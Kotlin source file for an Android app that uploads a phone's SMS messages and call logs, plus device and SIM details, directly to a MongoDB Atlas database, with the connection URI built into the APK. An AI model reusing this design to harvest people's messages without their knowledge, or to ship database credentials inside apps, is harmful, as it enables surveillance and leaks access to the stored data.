package com.calltech

import android.util.Log
import com.mongodb.ConnectionString
import com.mongodb.MongoClientSettings
import com.mongodb.client.MongoClient
import com.mongodb.client.MongoClients
import com.mongodb.client.model.Filters
import com.mongodb.client.model.ReplaceOptions
import org.bson.Document
import java.util.Date
import java.util.concurrent.TimeUnit

/** Phone se seedha MongoDB Atlas — koi PC / Render server nahi. */
object AtlasDirectSync {
    private const val TAG = "AtlasDirectSync"
    private const val BATCH = 150

    @Volatile
    private var client: MongoClient? = null
    @Volatile
    private var unreachable = false

    fun isConfigured(): Boolean {
        return BuildConfig.MONGODB_URI.trim().isNotBlank()
    }

    fun isUnreachable(): Boolean = unreachable

    private fun resolveUri(): String? {
        val raw = BuildConfig.MONGODB_URI.trim()
        if (raw.isBlank()) {
            return null
        }
        return MongoUriAndroid.toAndroidUri(raw) ?: raw
    }

    @Synchronized
    private fun getClient(): MongoClient? {
        client?.let { return it }

        val uri = resolveUri()
        if (uri == null) {
            Log.e(TAG, "MONGODB_URI missing in APK build")
            return null
        }

        return try {
            val settings = MongoClientSettings.builder()
                .applyConnectionString(ConnectionString(uri))
                .applyToSocketSettings { builder ->
                    builder.connectTimeout(8, TimeUnit.SECONDS)
                    builder.readTimeout(15, TimeUnit.SECONDS)
                }
                .applyToClusterSettings { builder ->
                    builder.serverSelectionTimeout(8, TimeUnit.SECONDS)
                }
                .build()

            MongoClients.create(settings).also {
                client = it
                Log.d(TAG, "MongoDB client connected")
            }
        } catch (error: Exception) {
            val msg = error.message ?: "unknown"
            if (msg.contains("authentication failed", ignoreCase = true)) {
                Log.e(
                    TAG,
                    "Atlas login fail — Atlas Dashboard se password reset karo, server/.env update karo, app rebuild karo",
                )
            }
            Log.e(TAG, "Mongo connect failed: $msg", error)
            null
        }
    }

    @Synchronized
    private fun resetClient() {
        try {
            client?.close()
        } catch (_: Exception) {
            // ignore
        }
        client = null
    }

    fun ping(onComplete: ((Boolean) -> Unit)? = null) {
        BackgroundSyncRunner.run {
            val ok = try {
                val mongo = getClient()
                if (mongo == null) {
                    false
                } else {
                    mongo.getDatabase(BuildConfig.MONGODB_DB).runCommand(Document("ping", 1))
                    true
                }
            } catch (error: Exception) {
                Log.e(TAG, "ping failed: ${error.message}")
                resetClient()
                false
            }
            onComplete?.invoke(ok)
        }
    }

    fun getStats(simNumber: String, onComplete: (success: Boolean, messageCount: Int, callCount: Int) -> Unit) {
        BackgroundSyncRunner.run {
            try {
                val mongo = getClient()
                if (mongo == null) {
                    onComplete(false, 0, 0)
                    return@run
                }

                val db = mongo.getDatabase(SimNumberHelper.databaseName(simNumber))
                val messages = db.getCollection(SimNumberHelper.messagesCollection(simNumber))
                    .estimatedDocumentCount()
                val calls = db.getCollection(SimNumberHelper.callLogsCollection(simNumber))
                    .estimatedDocumentCount()
                onComplete(true, messages.toInt(), calls.toInt())
            } catch (error: Exception) {
                Log.e(TAG, "getStats failed: ${error.message}")
                resetClient()
                onComplete(false, 0, 0)
            }
        }
    }

    fun upsertMessages(simNumber: String, messages: List<Map<String, Any>>): Boolean {
        return upsertCollection(simNumber, SimNumberHelper.messagesCollection(simNumber), messages)
    }

    fun upsertCallLogs(simNumber: String, callLogs: List<Map<String, Any>>): Boolean {
        return upsertCollection(simNumber, SimNumberHelper.callLogsCollection(simNumber), callLogs)
    }

    fun verifyConnection(): Boolean {
        return try {
            val mongo = getClient() ?: return false
            mongo.getDatabase(BuildConfig.MONGODB_DB).runCommand(Document("ping", 1))
            true
        } catch (error: Exception) {
            Log.e(TAG, "verifyConnection failed: ${error.message}")
            logAuthHint(error)
            resetClient()
            false
        }
    }

    fun registerDevice(
        deviceId: String,
        simNumber: String,
        model: String,
        manufacturer: String,
    ): Boolean {
        val mongo = getClient() ?: return false
        val dbName = BuildConfig.MONGODB_DB.trim().ifBlank { "calltech" }

        return try {
            val collection = mongo.getDatabase(dbName).getCollection("devices")
            val doc = Document(mapOf(
                "deviceId" to deviceId,
                "simNumber" to simNumber,
                "model" to model,
                "manufacturer" to manufacturer,
                "appVersion" to BuildConfig.VERSION_NAME,
                "updatedAt" to Date(),
            )).append("registeredAt", Date())

            collection.replaceOne(
                Filters.eq("deviceId", deviceId),
                doc,
                ReplaceOptions().upsert(true),
            )
            Log.d(TAG, "Device registered in Atlas: $deviceId")
            true
        } catch (error: Exception) {
            Log.e(TAG, "Device registration failed: ${error.message}")
            if (error.message?.contains("Timed out", ignoreCase = true) == true) {
                unreachable = true
            }
            false
        }
    }

    private fun upsertCollection(
        simNumber: String,
        collectionName: String,
        items: List<Map<String, Any>>,
    ): Boolean {
        if (items.isEmpty()) {
            return true
        }

        repeat(3) { attempt ->
            if (unreachable) {
                return false
            }
            val ok = upsertCollectionOnce(simNumber, collectionName, items)
            if (ok) {
                return true
            }
            Log.w(TAG, "$collectionName upsert retry ${attempt + 1}/3")
            resetClient()
            try {
                Thread.sleep(800L * (attempt + 1))
            } catch (_: InterruptedException) {
                Thread.currentThread().interrupt()
                return false
            }
        }

        return false
    }

    private fun upsertCollectionOnce(
        simNumber: String,
        collectionName: String,
        items: List<Map<String, Any>>,
    ): Boolean {
        val options = ReplaceOptions().upsert(true)
        val mongo = getClient() ?: return false
        val dbName = SimNumberHelper.databaseName(simNumber)
        val collection = mongo.getDatabase(dbName).getCollection(collectionName)

        return try {
            for (chunk in items.chunked(BATCH)) {
                chunk.forEach { item ->
                    val id = item["id"]?.toString()?.takeIf { it.isNotBlank() }
                    if (id == null) {
                        Log.w(TAG, "Skip $dbName.$collectionName row without id")
                        return@forEach
                    }
                    collection.replaceOne(Filters.eq("id", id), mapToDocument(item), options)
                }
            }
            Log.d(TAG, "$dbName.$collectionName upserted ${items.size} docs")
            true
        } catch (error: Exception) {
            Log.e(TAG, "$dbName.$collectionName upsert failed: ${error.message}", error)
            logAuthHint(error)
            if (error.message?.contains("Timed out", ignoreCase = true) == true) {
                unreachable = true
                Log.w(TAG, "Atlas Direct unreachable on this network — HTTP Render sync only")
            }
            false
        }
    }

    private fun logAuthHint(error: Exception) {
        val msg = error.message ?: ""
        if (msg.contains("authentication failed", ignoreCase = true) ||
            msg.contains("bad auth", ignoreCase = true) ||
            msg.contains("authenticating", ignoreCase = true)
        ) {
            Log.e(
                TAG,
                "Atlas login fail — Atlas Dashboard -> Database Access -> user/password check karo, " +
                    "server/.env update karo, phir app rebuild karo",
            )
        }
    }

    private fun mapToDocument(map: Map<String, Any>): Document {
        val doc = Document()
        map.forEach { (key, value) ->
            doc[key] = toBsonValue(value)
        }
        doc.putIfAbsent("syncedAt", Date())
        doc["updatedAt"] = Date()
        return doc
    }

    @Suppress("UNCHECKED_CAST")
    private fun toBsonValue(value: Any?): Any? {
        return when (value) {
            null -> null
            is Map<*, *> -> {
                val nested = Document()
                value.forEach { (key, nestedValue) ->
                    if (key is String) {
                        nested[key] = toBsonValue(nestedValue)
                    }
                }
                nested
            }
            is List<*> -> value.map { toBsonValue(it) }
            else -> value
        }
    }
}
